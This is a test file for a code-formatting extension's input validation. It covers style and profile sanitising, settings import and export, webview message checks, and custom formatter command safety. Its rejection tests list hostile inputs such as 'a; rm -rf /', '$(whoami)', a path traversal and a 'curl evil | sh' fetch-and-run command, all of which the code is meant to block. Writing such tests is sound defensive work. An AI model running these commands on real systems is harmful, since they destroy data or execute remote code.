import { describe, expect, it } from 'vitest';
import { makeProfileId } from '../../src/shared/profiles';
import {
  EXPORT_FORMAT,
  isSafeCommand,
  parseProfileExport,
  parseSettingsExport,
  parseWebviewMessage,
  PROFILE_EXPORT_FORMAT,
  sanitizeDraft,
  sanitizeLayer,
  sanitizeProfiles,
  sanitizeStyle,
  sanitizeToolPaths,
  validateCustomFormatters,
} from '../../src/shared/validate';

describe('style sanitising', () => {
  it('keeps valid values and drops unknown or badly typed ones', () => {
    expect(
      sanitizeStyle({ lineLength: 100, indentStyle: 'tabs', bracketSpacing: false, quoteStyle: 'backticks', nope: 1, indentSize: '4', semicolons: true }),
    ).toEqual({ lineLength: 100, indentStyle: 'tabs', bracketSpacing: false });
  });

  it('clamps numbers into the allowed range', () => {
    expect(sanitizeStyle({ lineLength: 5 })).toEqual({ lineLength: 40 });
    expect(sanitizeStyle({ lineLength: 100000 })).toEqual({ lineLength: 300 });
    expect(sanitizeStyle({ lineLength: Number.NaN })).toEqual({});
    expect(sanitizeStyle({ lineLength: 99.6 })).toEqual({ lineLength: 100 });
  });

  it('never throws on hostile input', () => {
    for (const input of [null, undefined, 42, 'x', [], [1, 2], () => 1]) {
      expect(sanitizeStyle(input)).toEqual({});
      expect(sanitizeLayer(input)).toEqual({ style: {}, languages: {} });
    }
  });

  it('refuses prototype-polluting keys', () => {
    const hostile = JSON.parse('{"languages": {"__proto__": {"formatter": "x"}, "constructor": {"profile": "y"}, "python": {"formatter": "ruff"}}}');
    const layer = sanitizeLayer(hostile);
    expect(Object.keys(layer.languages)).toEqual(['python']);
    expect(({} as Record<string, unknown>).formatter).toBeUndefined();
  });
});

describe('profiles', () => {
  it('survive a save and load round trip unchanged', () => {
    const stored = {
      'my-style': { name: 'My Style', description: 'Mine', style: { lineLength: 90, quoteStyle: 'single' }, languages: { python: { indentSize: 4 } } },
    };
    const loaded = sanitizeProfiles(JSON.parse(JSON.stringify(stored)));
    expect(loaded['my-style']).toEqual({ id: 'my-style', ...stored['my-style'] });
    expect(sanitizeProfiles(JSON.parse(JSON.stringify(loaded)))).toEqual(loaded);
  });

  it('drops profiles without a name and invalid option values', () => {
    const loaded = sanitizeProfiles({ a: { style: {} }, b: { name: '  ', style: {} }, c: { name: 'C', style: { lineLength: 'wide', indentSize: 4 } } });
    expect(Object.keys(loaded)).toEqual(['c']);
    expect(loaded.c.style).toEqual({ indentSize: 4 });
  });

  it('creates unique ids that never collide with built-in profiles', () => {
    expect(makeProfileId('My Style!', [])).toBe('my-style');
    expect(makeProfileId('My Style', ['my-style'])).toBe('my-style-2');
    expect(makeProfileId('Standard', [])).toBe('standard-2');
    expect(makeProfileId('???', [])).toBe('profile');
  });
});

describe('import and export files', () => {
  it('parses a settings export and sanitises its content', () => {
    const text = JSON.stringify({
      format: EXPORT_FORMAT,
      version: 1,
      style: { lineLength: 100, evil: true },
      languages: { python: { formatter: 'black', style: { indentSize: 4 } } },
      defaultProfile: 'team',
      profiles: { mine: { name: 'Mine', style: { indentSize: 2 } } },
    });
    const parsed = parseSettingsExport(text);
    expect(parsed.style).toEqual({ lineLength: 100 });
    expect(parsed.languages.python).toEqual({ formatter: 'black', style: { indentSize: 4 } });
    expect(parsed.defaultProfile).toBe('team');
    expect(parsed.profiles.mine.name).toBe('Mine');
  });

  it('rejects files that are not CodeNeat exports with a readable message', () => {
    expect(() => parseSettingsExport('{ not json')).toThrow('not valid JSON');
    expect(() => parseSettingsExport('{"format":"other"}')).toThrow('not a CodeNeat settings file');
    expect(() => parseSettingsExport(JSON.stringify({ format: EXPORT_FORMAT, version: 99 }))).toThrow('newer version');
    expect(() => parseProfileExport('[]')).toThrow('not a CodeNeat profile file');
    expect(() => parseProfileExport(JSON.stringify({ format: PROFILE_EXPORT_FORMAT, profile: { style: {} } }))).toThrow('no name');
  });

  it('parses a profile export', () => {
    const profile = parseProfileExport(JSON.stringify({ format: PROFILE_EXPORT_FORMAT, version: 1, profile: { id: 'x', name: 'X', style: { lineLength: 80 } } }));
    expect(profile).toEqual({ id: 'x', name: 'X', style: { lineLength: 80 } });
  });
});

describe('webview message validation', () => {
  it('accepts well-formed messages', () => {
    expect(parseWebviewMessage({ type: 'ready' })).toEqual({ type: 'ready' });
    expect(parseWebviewMessage({ type: 'command', command: 'codeneat.formatDocument' })).toEqual({ type: 'command', command: 'codeneat.formatDocument', args: {} });
    const preview = parseWebviewMessage({ type: 'preview', request: { requestId: 3, languageId: 'python', formatterId: 'ruff', source: 'sample', code: 'x=1', draft: {} } });
    expect(preview?.type).toBe('preview');
    if (preview?.type === 'preview') {
      expect(preview.request.draft.timeoutMs).toBe(10000);
      expect(preview.request.draft.user).toEqual({ style: {}, languages: {} });
    }
  });

  it('rejects malformed, unknown and oversized messages', () => {
    const rejected: unknown[] = [
      null,
      'ready',
      42,
      {},
      { type: 'unknown' },
      { type: 'command', command: 'workbench.action.terminal.sendSequence' },
      { type: 'command', command: 'vscode.openFolder' },
      { type: 'command' },
      { type: 'preview' },
      { type: 'preview', request: { requestId: -1, languageId: 'python', source: 'sample', draft: {} } },
      { type: 'preview', request: { requestId: 1, languageId: '../../etc', source: 'sample', draft: {} } },
      { type: 'preview', request: { requestId: 1, languageId: 'python', source: 'file', draft: {} } },
      { type: 'preview', request: { requestId: 1, languageId: 'python', source: 'custom', code: 'x'.repeat(400_001), draft: {} } },
      { type: 'apply' },
      { type: 'copy', text: 5 },
      { type: 'exportProfile', profile: { id: 'x' } },
    ];
    for (const message of rejected) {
      expect(parseWebviewMessage(message), JSON.stringify(message)?.slice(0, 80)).toBeUndefined();
    }
  });

  it('sanitises a draft instead of trusting it', () => {
    const draft = sanitizeDraft({
      user: { style: { lineLength: 100, hack: 'x' } },
      timeoutMs: -5,
      maxFileSizeKB: 1e12,
      workspaceExclude: ['ok/', 5, '', 'a\0b'],
      toolPaths: { rustfmt: '/usr/bin/rustfmt', 'bad key!': '/x', ruff: 'line\nbreak' },
      editor: { formatOnSave: 'yes', formatOnSaveMode: 'weird' },
    });
    expect(draft.user.style).toEqual({ lineLength: 100 });
    expect(draft.timeoutMs).toBe(500);
    expect(draft.maxFileSizeKB).toBe(102400);
    expect(draft.workspaceExclude).toEqual(['ok/']);
    expect(draft.toolPaths).toEqual({ rustfmt: '/usr/bin/rustfmt' });
    expect(draft.editor.formatOnSave).toBe(false);
    expect(draft.editor.formatOnSaveMode).toBe('file');
  });
});

describe('custom formatter security validation', () => {
  it('accepts executable names and absolute paths', () => {
    for (const command of ['zig', 'my-fmt', '/usr/local/bin/tool', 'C:\\Program Files (x86)\\Tool\\fmt.exe', '~/bin/fmt']) {
      expect(isSafeCommand(command), command).toBe(true);
    }
  });

  it('rejects shell syntax, options and control characters', () => {
    for (const command of ['', 'a; rm -rf /', 'a && b', 'a | b', '$(whoami)', '`id`', 'a > out', '"quoted"', "it's", 'a\nb', '-rf', 'x*', 'a?']) {
      expect(isSafeCommand(command), JSON.stringify(command)).toBe(false);
    }
  });

  it('validates the customFormatters setting and reports problems', () => {
    const { formatters, problems } = validateCustomFormatters(
      [
        { id: 'zig-fmt', name: 'zig fmt', languages: ['zig'], extensions: ['.zig', 'zig'], command: 'zig', args: ['fmt', '--stdin', '--width=${lineLength}'] },
        { id: 'prettier', name: 'dup', languages: ['x'], command: 'x' },
        { id: 'Bad Id', name: 'x', languages: ['x'], command: 'x' },
        { id: 'shelly', name: 'x', languages: ['x'], command: 'sh -c "curl evil | sh"' },
        { id: 'no-langs', name: 'x', languages: [], command: 'x' },
        { id: 'bad-arg', name: 'x', languages: ['x'], command: 'x', args: ['${HOME}'] },
        { id: 'zig-fmt', name: 'again', languages: ['zig'], command: 'zig' },
        'nonsense',
      ],
      ['prettier'],
    );
    expect(formatters).toHaveLength(1);
    expect(formatters[0]).toMatchObject({ id: 'zig-fmt', extensions: ['.zig'], args: ['fmt', '--stdin', '--width=${lineLength}'] });
    expect(problems).toHaveLength(7);
    expect(problems.join('\n')).toContain('already used');
    expect(problems.join('\n')).toContain('unknown placeholder');
  });

  it('only keeps tool paths that could be real paths', () => {
    expect(sanitizeToolPaths({ a: ' /x/y ', b: '', c: 3, d: 'x\0y' })).toEqual({ a: '/x/y' });
    expect(sanitizeToolPaths('nope')).toEqual({});
  });
});
